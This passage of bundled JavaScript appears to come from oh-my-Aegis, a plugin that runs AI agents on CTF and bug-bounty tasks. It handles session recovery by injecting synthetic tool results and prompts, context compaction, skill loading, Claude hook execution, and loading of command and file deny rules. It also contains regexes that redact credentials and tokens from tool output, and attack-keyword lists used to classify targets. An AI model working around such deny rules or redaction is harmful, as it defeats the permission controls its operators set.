    if (!sessionClient) {
      return;
    }
    if (type !== "message.updated") {
      return;
    }
    const info = extractMessageInfoFromUpdatedEvent(props);
    if (!info) {
      return;
    }
    if (info.role !== "assistant") {
      return;
    }
    const errorType = detectSessionRecoveryErrorType(info.error);
    if (!errorType) {
      return;
    }
    if (processingByMessageID.has(info.messageID)) {
      return;
    }
    processingByMessageID.add(info.messageID);
    try {
      const state = params.store.get(info.sessionID);
      const summary = extractErrorMessage(info.error).replace(/\s+/g, " ").trim().slice(0, 240);
      const routeName = state.lastTaskCategory || "session-recovery";
      params.store.recordFailure(info.sessionID, "environment", routeName, `${errorType}: ${summary}`);
      await showToast({
        client: params.client,
        directory: params.directory,
        title: "oh-my-Aegis: session recovery",
        message: `Recovering from ${errorType}...`,
        variant: "warning"
      });
      await callSessionAbort2(sessionClient, info.sessionID, params.directory);
      const messages = await callSessionMessages(sessionClient, info.sessionID, params.directory, 200);
      if (!messages) {
        params.notesStore.recordScan(`Session recovery failed: could not load messages (type=${errorType}) session=${info.sessionID}`);
        return;
      }
      const failed = findMessageById(messages, info.messageID);
      if (!failed) {
        params.notesStore.recordScan(`Session recovery failed: message not found (type=${errorType}) session=${info.sessionID} message=${info.messageID}`);
        return;
      }
      if (errorType === "tool_result_missing") {
        const toolUses = extractToolUses(failed.parts);
        if (toolUses.length === 0) {
          params.notesStore.recordScan(`Session recovery failed: no tool_use IDs found (type=${errorType}) session=${info.sessionID} message=${info.messageID}`);
          return;
        }
        const prefix = "[oh-my-Aegis session recovery]";
        const toolResultParts = toolUses.map((t) => {
          const toolLabel = t.name ? `tool=${t.name}` : "tool=unknown";
          const content = state.mode === "BOUNTY" ? `${prefix} Missing tool_result for tool_use_id=${t.id} (${toolLabel}). Do NOT assume it didn't run. Check scope/side-effects before rerun; prefer read-only validation.` : `${prefix} Missing tool_result for tool_use_id=${t.id} (${toolLabel}). Treat as cancelled and continue. Re-run only if needed.`;
          return {
            type: "tool_result",
            tool_use_id: t.id,
            content
          };
        });
        const ok = await callSessionPromptParts(sessionClient, info.sessionID, params.directory, toolResultParts);
        params.notesStore.recordScan(`Session recovery tool_result_missing: injected=${toolUses.length} ok=${ok} session=${info.sessionID} message=${info.messageID}`);
        if (ok) {
          await showToast({
            client: params.client,
            directory: params.directory,
            title: "oh-my-Aegis: session recovered",
            message: "Injected missing tool results. Retry the last step.",
            variant: "success"
          });
        }
        return;
      }
      params.notesStore.recordScan(`Session recovery detected unsupported errorType=${errorType} session=${info.sessionID} message=${info.messageID}`);
    } finally {
      processingByMessageID.delete(info.messageID);
    }
  };
  return { isRecoverableError, handleEvent };
}

// src/recovery/model-id.ts
function parseModelId(model) {
  const trimmed = String(model ?? "").trim();
  const idx = trimmed.indexOf("/");
  if (idx <= 0 || idx === trimmed.length - 1) {
    return { providerID: "unknown", modelID: trimmed };
  }
  return {
    providerID: trimmed.slice(0, idx),
    modelID: trimmed.slice(idx + 1)
  };
}

// src/recovery/context-window-recovery.ts
function isRecord7(value) {
  return Boolean(value) && typeof value === "object" && !Array.isArray(value);
}
function hasError5(result) {
  if (!isRecord7(result))
    return false;
  return Boolean(result.error);
}
async function showToast2(params) {
  const tui = isRecord7(params.client) ? params.client.tui : null;
  const toastFn = isRecord7(tui) ? tui.showToast : null;
  if (typeof toastFn !== "function")
    return;
  const title = params.title.slice(0, 80);
  const message = params.message.slice(0, 240);
  const duration5 = 3000;
  try {
    await toastFn({
      directory: params.directory,
      title,
      message,
      variant: params.variant,
      duration: duration5
    });
    return;
  } catch {}
  try {
    await toastFn({
      query: { directory: params.directory },
      body: { title, message, variant: params.variant, duration: duration5 }
    });
  } catch {}
}
function extractProviderModelFromMessageUpdated(props) {
  const info = isRecord7(props.info) ? props.info : null;
  if (!info)
    return null;
  const providerID = typeof info.providerID === "string" ? info.providerID : "";
  const modelID = typeof info.modelID === "string" ? info.modelID : "";
  if (providerID && modelID)
    return { providerID, modelID };
  return null;
}
function toRatio(value) {
  if (typeof value !== "number" || !Number.isFinite(value)) {
    return null;
  }
  if (value < 0) {
    return null;
  }
  if (value <= 1) {
    return value;
  }
  if (value <= 100) {
    return value / 100;
  }
  return null;
}
function extractContextUsageRatio(props) {
  const info = isRecord7(props.info) ? props.info : props;
  const directCandidates = [
    info.contextUsageRatio,
    info.context_window_ratio,
    info.contextWindowUsageRatio,
    info.contextWindowPercent,
    info.contextUsagePercent,
    info.tokenUsageRatio
  ];
  for (const candidate of directCandidates) {
    const ratio = toRatio(candidate);
    if (ratio !== null) {
      return ratio;
    }
  }
  if (isRecord7(info.usage)) {
    const usage = info.usage;
    const ratio = toRatio(usage.contextUsageRatio);
    if (ratio !== null) {
      return ratio;
    }
    const total = typeof usage.totalTokens === "number" ? usage.totalTokens : typeof usage.total_tokens === "number" ? usage.total_tokens : null;
    const window = typeof usage.contextWindowTokens === "number" ? usage.contextWindowTokens : typeof usage.context_window_tokens === "number" ? usage.context_window_tokens : null;
    if (typeof total === "number" && typeof window === "number" && window > 0) {
      return Math.max(0, Math.min(1, total / window));
    }
  }
  return null;
}
function getSummarizeFn(client) {
  if (!client || typeof client !== "object")
    return null;
  const session = client.session;
  if (!session || typeof session !== "object")
    return null;
  const fn = session.summarize;
  return typeof fn === "function" ? fn : null;
}
function getPromptAsyncFn(client) {
  if (!client || typeof client !== "object")
    return null;
  const session = client.session;
  if (!session || typeof session !== "object")
    return null;
  const fn = session.promptAsync;
  return typeof fn === "function" ? fn : null;
}
async function callSessionPromptAsync2(params) {
  try {
    const result = await params.promptAsyncFn({
      sessionID: params.sessionID,
      directory: params.directory,
      text: params.prompt,
      source: "oh-my-Aegis.context-budget"
    });
    return !hasError5(result);
  } catch {
    return false;
  }
}
async function callSessionSummarize(params) {
  try {
    const primary = await params.summarizeFn({
      path: { id: params.sessionID },
      body: { providerID: params.providerID, modelID: params.modelID },
      query: { directory: params.directory }
    });
    if (!hasError5(primary))
      return true;
  } catch {}
  try {
    const fallback = await params.summarizeFn({
      sessionID: params.sessionID,
      directory: params.directory,
      providerID: params.providerID,
      modelID: params.modelID
    });
    return !hasError5(fallback);
  } catch {
    return false;
  }
}
async function callSessionMessages2(sessionClient, sessionID, directory, limit) {
  try {
    const primary = await sessionClient.messages({
      path: { id: sessionID },
      query: { directory, limit }
    });
    if (!hasError5(primary) && Array.isArray(primary.data)) {
      return primary.data;
    }
  } catch {}
  try {
    const fallback = await sessionClient.messages({ sessionID, directory, limit });
    if (!hasError5(fallback) && Array.isArray(fallback.data)) {
      return fallback.data;
    }
  } catch {}
  return null;
}
function extractLastAssistantProviderModel(messages) {
  let best = null;
  for (const msg of messages) {
    if (!isRecord7(msg))
      continue;
    const info = isRecord7(msg.info) ? msg.info : null;
    const role = typeof msg.role === "string" ? msg.role : info && typeof info.role === "string" ? String(info.role) : "";
    if (role !== "assistant")
      continue;
    const providerID = info && typeof info.providerID === "string" ? String(info.providerID) : "";
    const modelID = info && typeof info.modelID === "string" ? String(info.modelID) : "";
    if (providerID && modelID) {
      best = { providerID, modelID };
    }
  }
  return best;
}
function createContextWindowRecoveryManager(params) {
  const sessionClient = extractSessionClient(params.client);
  const summarizeFn = getSummarizeFn(params.client);
  const promptAsyncFn = getPromptAsyncFn(params.client);
  const inProgress = new Set;
  const lastAttemptAt = new Map;
  const attemptCount = new Map;
  const proactiveArmed = new Set;
  const shouldAttempt = (sessionID) => {
    const now = Date.now();
    const last = lastAttemptAt.get(sessionID) ?? 0;
    if (now - last < params.config.recovery.context_window_recovery_cooldown_ms) {
      return false;
    }
    const count = attemptCount.get(sessionID) ?? 0;
    if (count >= params.config.recovery.context_window_recovery_max_attempts_per_session) {
      return false;
    }
    return true;
  };
  const recordAttempt = (sessionID) => {
    lastAttemptAt.set(sessionID, Date.now());
    attemptCount.set(sessionID, (attemptCount.get(sessionID) ?? 0) + 1);
  };
  const recover = async (sessionID, summarizeArgs, reason, options) => {
    if (!params.config.recovery.enabled || !params.config.recovery.context_window_recovery)
      return;
    if (!sessionClient || !summarizeFn)
      return;
    if (inProgress.has(sessionID))
      return;
    if (!shouldAttempt(sessionID)) {
      params.notesStore.recordScan(`Context window recovery skipped: budget/cooldown session=${sessionID} reason=${reason}`);
      return;
    }
    if (options?.recordStateEvent) {
      params.store.applyEvent(sessionID, "context_length_exceeded");
      if (params.config.recovery.auto_compact_on_context_failure) {
        const actions = params.notesStore.compactNow();
        for (const action of actions) {
          params.notesStore.recordScan(`Context overflow note compaction: ${action} session=${sessionID}`);
        }
      }
    } else if (typeof options?.proactiveRatio === "number" && params.config.recovery.auto_compact_on_context_failure) {
      const actions = params.notesStore.compactNow();
      for (const action of actions) {
        params.notesStore.recordScan(`Proactive context compaction: ratio=${options.proactiveRatio.toFixed(3)} action=${action} session=${sessionID}`);
      }
    }
    inProgress.add(sessionID);
    recordAttempt(sessionID);
    try {
      await showToast2({
        client: params.client,
        directory: params.directory,
        title: "oh-my-Aegis: context recovery",
        message: "Context limit hit. Summarizing session...",
        variant: "warning"
      });
      const ok = await callSessionSummarize({
        summarizeFn,
        sessionID,
        directory: params.directory,
        providerID: summarizeArgs.providerID,
        modelID: summarizeArgs.modelID
      });
      params.notesStore.recordScan(`Context window recovery attempt: ok=${ok} provider=${summarizeArgs.providerID} model=${summarizeArgs.modelID} session=${sessionID} reason=${reason}`);
      if (ok) {
        if (options?.injectPrompt && promptAsyncFn) {
          const state = params.store.get(sessionID);
          const ratioText = typeof options?.proactiveRatio === "number" ? `${Math.round(options.proactiveRatio * 100)}%` : "high";
          const prompt = [
            "[oh-my-Aegis context-budget]",
            `Context usage reached ${ratioText}; proactive compaction + summarize completed.`,
            "Continue in manager mode: delegate with task subagents and avoid direct execution.",
            "Preserve continuity from durable logs: STATE/WORKLOG/EVIDENCE/CONTEXT_PACK.",
            `Current state: mode=${state.mode} phase=${state.phase} target=${state.targetType}`
          ].join(`
`);
          const injected = await callSessionPromptAsync2({
            promptAsyncFn,
            sessionID,
            directory: params.directory,
            prompt
          });
          params.notesStore.recordScan(`Context budget continuation prompt injected: ok=${injected} session=${sessionID}`);
        }
        await showToast2({
          client: params.client,
          directory: params.directory,
          title: "oh-my-Aegis: context recovered",
          message: "Session summarized. Retry the last step.",
          variant: "success"
        });
      }
    } finally {
      inProgress.delete(sessionID);
    }
  };
  const deriveSummarizeArgs = async (sessionID, props) => {
    const fromUpdated = props ? extractProviderModelFromMessageUpdated(props) : null;
    if (fromUpdated)
      return fromUpdated;
    if (sessionClient) {
      const messages = await callSessionMessages2(sessionClient, sessionID, params.directory, 60);
      if (messages) {
        const last = extractLastAssistantProviderModel(messages);
        if (last)
          return last;
      }
    }
    const model = typeof params.getDefaultModel === "function" ? params.getDefaultModel(sessionID) ?? "" : "";
    const parsed = parseModelId(model);
    return {
      providerID: parsed.providerID,
      modelID: parsed.modelID
    };
  };
  const handleContextFailureText = async (sessionID, text) => {
    if (!params.config.recovery.enabled || !params.config.recovery.context_window_recovery)
      return;
    if (!isContextLengthFailure(text))
      return;
    const summarizeArgs = await deriveSummarizeArgs(sessionID);
    await recover(sessionID, summarizeArgs, "tool.execute.after", { recordStateEvent: false });
  };
  const handleEvent = async (type, props) => {
    if (!params.config.recovery.enabled || !params.config.recovery.context_window_recovery)
      return;
    if (type === "session.error") {
      const sessionID = typeof props.sessionID === "string" ? props.sessionID : "";
      const error92 = props.error;
      const message = extractErrorMessage(error92);
      if (!sessionID || !isContextLengthFailure(message))
        return;
      const summarizeArgs = await deriveSummarizeArgs(sessionID);
      await recover(sessionID, summarizeArgs, "session.error", { recordStateEvent: true });
      return;
    }
    if (type === "message.updated") {
      const info = isRecord7(props.info) ? props.info : null;
      if (!info)
        return;
      const sessionID = typeof info.sessionID === "string" ? info.sessionID : "";
      const role = typeof info.role === "string" ? info.role : "";
      const error92 = info.error;
      const message = extractErrorMessage(error92);
      if (!sessionID || role !== "assistant")
        return;
      if (message && isContextLengthFailure(message)) {
        const summarizeArgs2 = await deriveSummarizeArgs(sessionID, props);
        await recover(sessionID, summarizeArgs2, "message.updated", { recordStateEvent: true });
        return;
      }
      if (!params.config.recovery.context_window_proactive_compaction) {
        return;
      }
      const ratio = extractContextUsageRatio(props);
      if (ratio === null) {
        return;
      }
      const threshold = params.config.recovery.context_window_proactive_threshold_ratio;
      const rearm = Math.min(threshold - 0.01, params.config.recovery.context_window_proactive_rearm_ratio);
      if (ratio <= rearm) {
        proactiveArmed.delete(sessionID);
        return;
      }
      if (ratio < threshold || proactiveArmed.has(sessionID)) {
        return;
      }
      proactiveArmed.add(sessionID);
      const summarizeArgs = await deriveSummarizeArgs(sessionID, props);
      await recover(sessionID, summarizeArgs, "message.updated.proactive", {
        recordStateEvent: false,
        proactiveRatio: ratio,
        injectPrompt: true
      });
    }
  };
  return { handleEvent, handleContextFailureText };
}

// src/skills/autoload.ts
import { existsSync as existsSync8, readdirSync as readdirSync2 } from "fs";
import { join as join9 } from "path";
function isNonEmptyString(value) {
  return typeof value === "string" && value.trim().length > 0;
}
function uniqueOrdered(values) {
  const out = [];
  const seen = new Set;
  for (const raw of values) {
    const v = raw.trim();
    if (!v)
      continue;
    if (seen.has(v))
      continue;
    seen.add(v);
    out.push(v);
  }
  return out;
}
function resolveOpencodeDir(environment = process.env) {
  const xdg = environment.XDG_CONFIG_HOME;
  if (xdg && xdg.trim().length > 0) {
    const candidate = join9(xdg, "opencode");
    if (existsSync8(candidate))
      return candidate;
  }
  const home = environment.HOME;
  if (home && home.trim().length > 0) {
    const candidate = join9(home, ".config", "opencode");
    if (existsSync8(candidate))
      return candidate;
  }
  const appData = environment.APPDATA;
  if (process.platform === "win32" && appData && appData.trim().length > 0) {
    const candidate = join9(appData, "opencode");
    if (existsSync8(candidate))
      return candidate;
  }
  return null;
}
function listSkillNames(skillsDir) {
  if (!skillsDir || !existsSync8(skillsDir)) {
    return [];
  }
  try {
    const entries = readdirSync2(skillsDir, { withFileTypes: true });
    const out = [];
    for (const entry of entries) {
      if (!entry.isDirectory())
        continue;
      const name = entry.name;
      if (!name || name.startsWith("."))
        continue;
      const skillPath = join9(skillsDir, name, "SKILL.md");
      if (!existsSync8(skillPath))
        continue;
      out.push(name);
    }
    return out;
  } catch {
    return [];
  }
}
function discoverAvailableSkills(projectDir, environment = process.env) {
  const out = new Set;
  const opencodeDir = resolveOpencodeDir(environment);
  const candidates2 = [
    opencodeDir ? join9(opencodeDir, "skills") : "",
    join9(projectDir, ".opencode", "skills"),
    join9(projectDir, ".claude", "skills")
  ].filter(Boolean);
  for (const dir of candidates2) {
    for (const name of listSkillNames(dir)) {
      out.add(name);
    }
  }
  return out;
}
function phaseKey(phase) {
  if (phase === "SCAN")
    return "scan";
  if (phase === "PLAN")
    return "plan";
  return "execute";
}
function normalizeSkillList(input) {
  const raw = [];
  if (Array.isArray(input)) {
    for (const item of input) {
      if (isNonEmptyString(item))
        raw.push(item);
    }
  } else if (isNonEmptyString(input)) {
    raw.push(input);
  }
  return uniqueOrdered(raw);
}
function filterAvailable(skills, availableSkills) {
  if (availableSkills.size === 0) {
    return skills;
  }
  return skills.filter((name) => availableSkills.has(name));
}
function resolveAutoloadSkills(params) {
  const cfg = params.config.skill_autoload;
  if (!cfg.enabled)
    return [];
  const modeKey = params.state.mode === "CTF" ? "ctf" : "bounty";
  const phase = phaseKey(params.state.phase);
  const target = params.state.targetType;
  const baseSubagent = baseAgentName(params.subagentType);
  const bySubagent = cfg.by_subagent[baseSubagent] ?? [];
  const baseList = cfg[modeKey][phase][target] ?? [];
  return filterAvailable(normalizeSkillList([...baseList, ...bySubagent]), params.availableSkills);
}
function mergeLoadSkills(params) {
  const existing = normalizeSkillList(params.existing);
  const autoload = filterAvailable(normalizeSkillList(params.autoload), params.availableSkills);
  const cap = Number.isFinite(params.maxSkills) ? params.maxSkills : 0;
  if (cap <= 0) {
    return existing;
  }
  if (existing.length >= cap) {
    return existing;
  }
  const remaining = cap - existing.length;
  const seen = new Set(existing);
  const extras = [];
  for (const name of autoload) {
    if (seen.has(name))
      continue;
    seen.add(name);
    extras.push(name);
    if (extras.length >= remaining)
      break;
  }
  return existing.concat(extras);
}

// src/hooks/claude-compat.ts
import { existsSync as existsSync9, statSync as statSync3 } from "fs";
import { join as join10 } from "path";
import { spawn as spawn2 } from "child_process";
function isFile(path) {
  try {
    return statSync3(path).isFile();
  } catch {
    return false;
  }
}
function truncate2(text, maxChars) {
  if (text.length <= maxChars)
    return text;
  return `${text.slice(0, maxChars)}
... [truncated]`;
}
async function runClaudeHook(params) {
  const hooksDir = join10(params.projectDir, ".claude", "hooks");
  const candidates2 = [
    join10(hooksDir, `${params.hookName}.sh`),
    join10(hooksDir, `${params.hookName}.bash`)
  ];
  const script = candidates2.find((p) => existsSync9(p) && isFile(p));
  if (!script) {
    return { ok: true };
  }
  const input = `${JSON.stringify(params.payload)}
`;
  const proc = spawn2("bash", [script], {
    cwd: params.projectDir,
    stdio: ["pipe", "pipe", "pipe"]
  });
  const maxWaitMs = Math.max(10, params.timeoutMs);
  try {
    proc.stdin.end(input);
  } catch (error92) {
    try {
      proc.stdin.end();
    } catch (endError) {}
  }
  const stdoutChunks = [];
  const stderrChunks = [];
  proc.stdout?.on("data", (chunk) => {
    stdoutChunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  });
  proc.stderr?.on("data", (chunk) => {
    stderrChunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  });
  const exited = new Promise((resolveExit) => {
    proc.once("close", (code) => {
      resolveExit({ code: typeof code === "number" ? code : 1, error: null, timedOut: false });
    });
    proc.once("error", (error92) => {
      resolveExit({ code: 127, error: error92 instanceof Error ? error92 : new Error(String(error92)), timedOut: false });
    });
  });
  const timed = new Promise((resolveTimeout) => {
    const timer = setTimeout(() => {
      try {
        proc.kill();
      } catch (error92) {}
      resolveTimeout({ code: 124, error: null, timedOut: true });
    }, maxWaitMs);
    proc.once("close", () => clearTimeout(timer));
    proc.once("error", () => clearTimeout(timer));
  });
  const exit = await Promise.race([exited, timed]);
  const stdout = Buffer.concat(stdoutChunks).toString("utf-8");
  const stderr = Buffer.concat(stderrChunks).toString("utf-8");
  if (exit.error) {
    const errno = exit.error;
    if (errno.code === "ENOENT") {
      return { ok: true };
    }
    return {
      ok: false,
      reason: `Claude hook ${params.hookName} failed to spawn bash: ${exit.error.message}`
    };
  }
  if (exit.timedOut) {
    return {
      ok: false,
      reason: `Claude hook ${params.hookName} timed out after ${maxWaitMs}ms.`
    };
  }
  const exitCode = exit.code;
  if (exitCode === 0) {
    return { ok: true };
  }
  const msg = [
    `Claude hook ${params.hookName} denied (exit=${exitCode})`,
    stderr.trim() ? `stderr: ${truncate2(stderr.trim(), 1200)}` : "",
    stdout.trim() ? `stdout: ${truncate2(stdout.trim(), 1200)}` : ""
  ].filter(Boolean).join(`
`);
  return { ok: false, reason: msg };
}

// src/index-core.ts
function isRecord8(value) {
  return Boolean(value) && typeof value === "object" && !Array.isArray(value);
}
function detectDockerParityRequirement(workdir) {
  const candidates2 = [
    join11(workdir, "README.md"),
    join11(workdir, "readme.md"),
    join11(workdir, "Dockerfile"),
    join11(workdir, "docker", "README.md")
  ];
  const mustRunInDocker = /(?:must|should|required|need(?:ed)?)\s+(?:to\s+)?run\s+in\s+docker|docker\s+only|run\s+with\s+docker/i;
  for (const path of candidates2) {
    if (!existsSync10(path))
      continue;
    try {
      const raw = readFileSync8(path, "utf-8");
      if (mustRunInDocker.test(raw)) {
        return {
          required: true,
          reason: `Docker parity required by ${relative3(workdir, path)}`
        };
      }
    } catch {
      continue;
    }
  }
  return { required: false, reason: "" };
}

class AegisPolicyDenyError extends Error {
  constructor(message) {
    super(message);
    this.name = "AegisPolicyDenyError";
  }
}
function escapeRegExp(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}
function normalizePathForMatch(path) {
  return path.replace(/\\/g, "/");
}
function globToRegExp(glob) {
  const normalized = normalizePathForMatch(glob);
  let pattern = "^";
  for (let i = 0;i < normalized.length; ) {
    const ch = normalized[i];
    if (ch === "*") {
      if (normalized[i + 1] === "*") {
        if (normalized[i + 2] === "/") {
          pattern += "(?:.*\\/)?";
          i += 3;
          continue;
        }
        pattern += ".*";
        i += 2;
        continue;
      }
      pattern += "[^/]*";
      i += 1;
      continue;
    }
    if (ch === "?") {
      pattern += "[^/]";
      i += 1;
      continue;
    }
    pattern += escapeRegExp(ch);
    i += 1;
  }
  pattern += "$";
  return new RegExp(pattern);
}
function normalizeToolName(value) {
  return value.replace(/[^a-z0-9_-]+/gi, "_").slice(0, 64);
}
function maskSensitiveToolOutput(text) {
  const patterns = [
    /\b(authorization\s*:\s*bearer\s+)([^\s\r\n]+)/gi,
    /\b(x-api-key\s*:\s*)([^\s\r\n]+)/gi,
    /\b(api[_-]?key\s*[=:]\s*)([^\s\r\n]+)/gi,
    /\b(client[_-]?secret\s*[=:]\s*)([^\s\r\n]+)/gi,
    /\b(access[_-]?token\s*[=:]\s*)([^\s\r\n]+)/gi,
    /\b(refresh[_-]?token\s*[=:]\s*)([^\s\r\n]+)/gi,
    /\b(session[_-]?id\s*[=:]\s*)([^\s\r\n]+)/gi,
    /\b(cookie\s*:\s*)([^\r\n]+)/gi,
    /\bset-cookie\s*:\s*([^\r\n]+)/gi,
    /\b(password\s*[=:]\s*)([^\s\r\n]+)/gi
  ];
  let out = text;
  for (const pattern of patterns) {
    out = out.replace(pattern, (_match, prefix) => `${prefix}[REDACTED]`);
  }
  return out;
}
function isPathInsideRoot(path, root) {
  const resolvedPath = resolve4(path);
  const resolvedRoot = resolve4(root);
  const rel = relative3(resolvedRoot, resolvedPath);
  if (!rel)
    return true;
  return !rel.startsWith("..") && !isAbsolute4(rel);
}
function truncateWithHeadTail(text, headChars, tailChars) {
  const safeHead = Math.max(0, Math.floor(headChars));
  const safeTail = Math.max(0, Math.floor(tailChars));
  if (text.length <= safeHead + safeTail + 64) {
    return text;
  }
  const head = text.slice(0, safeHead);
  const tail = safeTail > 0 ? text.slice(-safeTail) : "";
  return `${head}

... [truncated] ...

${tail}`;
}
function inProgressTodoCount(args) {
  if (!isRecord8(args)) {
    return 0;
  }
  const candidate = args.todos;
  if (!Array.isArray(candidate)) {
    return 0;
  }
  let count = 0;
  for (const todo of candidate) {
    if (!isRecord8(todo)) {
      continue;
    }
    if (todo.status === "in_progress") {
      count += 1;
    }
  }
  return count;
}
function todoStatusCounts(todos) {
  let pending = 0;
  let inProgress = 0;
  let completed = 0;
  for (const todo of todos) {
    if (!isRecord8(todo)) {
      continue;
    }
    const status = typeof todo.status === "string" ? todo.status : "";
    if (status === "pending")
      pending += 1;
    if (status === "in_progress")
      inProgress += 1;
    if (status === "completed")
      completed += 1;
  }
  return {
    pending,
    inProgress,
    completed,
    open: pending + inProgress
  };
}
function textFromParts(parts) {
  return parts.map((part) => {
    if (!part || typeof part !== "object") {
      return "";
    }
    const data = part;
    if (data.type !== "text") {
      return "";
    }
    return typeof data.text === "string" ? data.text : "";
  }).join(`
`).trim();
}
function textFromUnknown(value) {
  if (!value || typeof value !== "object") {
    return "";
  }
  const data = value;
  const chunks = [];
  const keys = ["text", "content", "prompt", "input", "message", "query", "goal", "description"];
  for (const key of keys) {
    const item = data[key];
    if (typeof item === "string" && item.trim().length > 0) {
      chunks.push(item);
      continue;
    }
    if (!item || typeof item !== "object") {
      continue;
    }
    const nested = item;
    if (typeof nested.text === "string" && nested.text.trim().length > 0) {
      chunks.push(nested.text);
    }
    if (typeof nested.content === "string" && nested.content.trim().length > 0) {
      chunks.push(nested.content);
    }
  }
  return chunks.join(`
`);
}
function detectTargetType(text) {
  const lower = text.toLowerCase();
  if (/(\bweb3\b|smart contract|solidity|evm|ethereum|foundry|hardhat|slither|reentrancy|erc20|defi|onchain|bridge)/i.test(lower)) {
    return "WEB3";
  }
  if (/(\bweb\b|\bapi\b|http|graphql|rest|websocket|grpc|idor|xss|sqli)/i.test(lower))
    return "WEB_API";
  if (/(\bpwn\b|heap|rop|shellcode|gdb|pwntools|format string|use-after-free)/i.test(lower))
    return "PWN";
  if (/(\brev\b|reverse|decompile|ghidra|ida|radare|disasm|elf|packer)/i.test(lower))
    return "REV";
  if (/(\bcrypto\b|cipher|rsa|aes|hash|ecc|curve|lattice|padding oracle)/i.test(lower))
    return "CRYPTO";
  if (/(\bforensics\b|pcap|pcapng|disk image|memory dump|volatility|wireshark|evtx|mft|registry hive|timeline|carv)/i.test(lower)) {
    return "FORENSICS";
  }
  if (/(\bmisc\b|steg|osint|encoding|puzzle|logic)/i.test(lower))
    return "MISC";
  return null;
}
var OhMyAegisPlugin = async (ctx) => {
  const configWarnings = [];
  const config3 = loadConfig(ctx.directory, { onWarning: (msg) => configWarnings.push(msg) });
  const availableSkills = discoverAvailableSkills(ctx.directory);
  const notesStore = new NotesStore(ctx.directory, config3.markdown_budget, config3.notes.root_dir);
  let notesReady = true;
  const softBashOverrideByCallId = new Map;
  const SOFT_BASH_OVERRIDE_TTL_MS = 10 * 60000;
  const pruneSoftBashOverrides = () => {
    const now = Date.now();
    for (const [callId, entry] of softBashOverrideByCallId.entries()) {
      if (now - entry.addedAt > SOFT_BASH_OVERRIDE_TTL_MS) {
        softBashOverrideByCallId.delete(callId);
      }
    }
    if (softBashOverrideByCallId.size <= 200) {
      return;
    }
    const entries = [...softBashOverrideByCallId.entries()].sort((a, b) => a[1].addedAt - b[1].addedAt);
    for (let i = 0;i < entries.length - 200; i += 1) {
      softBashOverrideByCallId.delete(entries[i][0]);
    }
  };
  const readContextByCallId = new Map;
  const injectedContextPathsBySession = new Map;
  const injectedContextPathsFor = (sessionID) => {
    const existing = injectedContextPathsBySession.get(sessionID);
    if (existing)
      return existing;
    const created = new Set;
    injectedContextPathsBySession.set(sessionID, created);
    return created;
  };
  const injectedClaudeRulePathsBySession = new Map;
  const injectedClaudeRulePathsFor = (sessionID) => {
    const existing = injectedClaudeRulePathsBySession.get(sessionID);
    if (existing)
      return existing;
    const created = new Set;
    injectedClaudeRulePathsBySession.set(sessionID, created);
    return created;
  };
  const writeToolOutputArtifact = (params) => {
    try {
      if (!notesReady) {
        return null;
      }
      const root = notesStore.getRootDirectory();
      const safeSessionID = normalizeSessionID(params.sessionID);
      const base = join11(root, "artifacts", "tool-output", safeSessionID);
      mkdirSync5(base, { recursive: true });
      const stamp = new Date().toISOString().replace(/[:.]/g, "-");
      const fileName = `${stamp}_${normalizeToolName(params.tool)}_${normalizeToolName(params.callID)}.txt`;
      const path = join11(base, fileName);
      const header = [
        `TITLE: ${params.title}`,
        `TOOL: ${params.tool}`,
        `SESSION: ${params.sessionID}`,
        `CALL: ${params.callID}`,
        "---",
        ""
      ].join(`
`);
      writeFileSync5(path, `${header}${params.output}
`, "utf-8");
      return path;
    } catch {
      return null;
    }
  };
  const scopePolicyCache = {
    lastLoadAt: 0,
    sourcePath: null,
    sourceMtimeMs: 0,
    result: { ok: false, reason: "not_loaded", warnings: [] }
  };
  const claudeDenyCache = {
    lastLoadAt: 0,
    sourceMtimeMs: 0,
    sourcePaths: [],
    denyBash: [],
    denyRead: [],
    denyEdit: [],
    warnings: []
  };
  const loadClaudeDenyRules = () => {
    const settingsDir = join11(ctx.directory, ".claude");
    const candidates2 = [
      join11(settingsDir, "settings.json"),
      join11(settingsDir, "settings.local.json")
    ];
    const sourcePaths = candidates2.filter((p) => existsSync10(p));
    let sourceMtimeMs = 0;
    for (const p of sourcePaths) {
      try {
        const st = statSync4(p);
        sourceMtimeMs = Math.max(sourceMtimeMs, st.mtimeMs);
      } catch {
        continue;
      }
    }
    const denyStrings = [];
    const warnings = [];
    const collectDeny = (path) => {
      let raw = "";
      try {
        raw = readFileSync8(path, "utf-8");
      } catch {
        warnings.push(`Failed to read Claude settings: ${relative3(ctx.directory, path)}`);
        return;
      }
      let parsed;
      try {
        parsed = JSON.parse(raw);
      } catch {
        warnings.push(`Failed to parse Claude settings JSON: ${relative3(ctx.directory, path)}`);
        return;
      }
      if (!isRecord8(parsed)) {
        warnings.push(`Claude settings root is not an object: ${relative3(ctx.directory, path)}`);
        return;
      }
      const permissions = parsed.permissions;
      if (!isRecord8(permissions)) {
        return;
      }
      const deny = permissions.deny;
      if (!Array.isArray(deny)) {
        return;
      }
      for (const entry of deny) {
        if (typeof entry === "string" && entry.trim().length > 0) {
          denyStrings.push(entry.trim());
        }
      }
    };
    for (const p of sourcePaths) {
      collectDeny(p);
    }
    const denyBash = [];
    const denyRead = [];
    const denyEdit = [];
    const toAbsPathGlob = (spec) => {
      const trimmed = spec.trim();
      if (!trimmed)
        return null;
      if (trimmed.startsWith("//")) {
        return resolve4("/", trimmed.slice(2));
      }
      if (trimmed.startsWith("~")) {
        const home = process.env.HOME || process.env.USERPROFILE;
        if (!home)
          return null;
        return resolve4(home, trimmed.slice(1));
      }
      if (trimmed.startsWith("/")) {
        return resolve4(settingsDir, trimmed.slice(1));
      }
      if (trimmed.startsWith("./")) {
        return resolve4(ctx.directory, trimmed.slice(2));
      }
      return resolve4(ctx.directory, trimmed);
    };
    for (const item of denyStrings) {
      const match = item.match(/^(Read|Edit|Bash)\((.*)\)$/);
      if (!match) {
        continue;
      }
      const kind = match[1];
      const spec = match[2] ?? "";
      if (kind === "Bash") {
        const escaped = escapeRegExp(spec);
        const re2 = new RegExp(`^${escaped.replace(/\\\*/g, ".*").replace(/\\\?/g, ".")}$`, "i");
        denyBash.push({ raw: item, re: re2 });
        continue;
      }
      const absGlob = toAbsPathGlob(spec);
      if (!absGlob) {
        continue;
      }
      let re;
      try {
        re = globToRegExp(absGlob);
      } catch {
        continue;
      }
      if (kind === "Read") {
        denyRead.push({ raw: item, re });
      } else {
        denyEdit.push({ raw: item, re });
      }
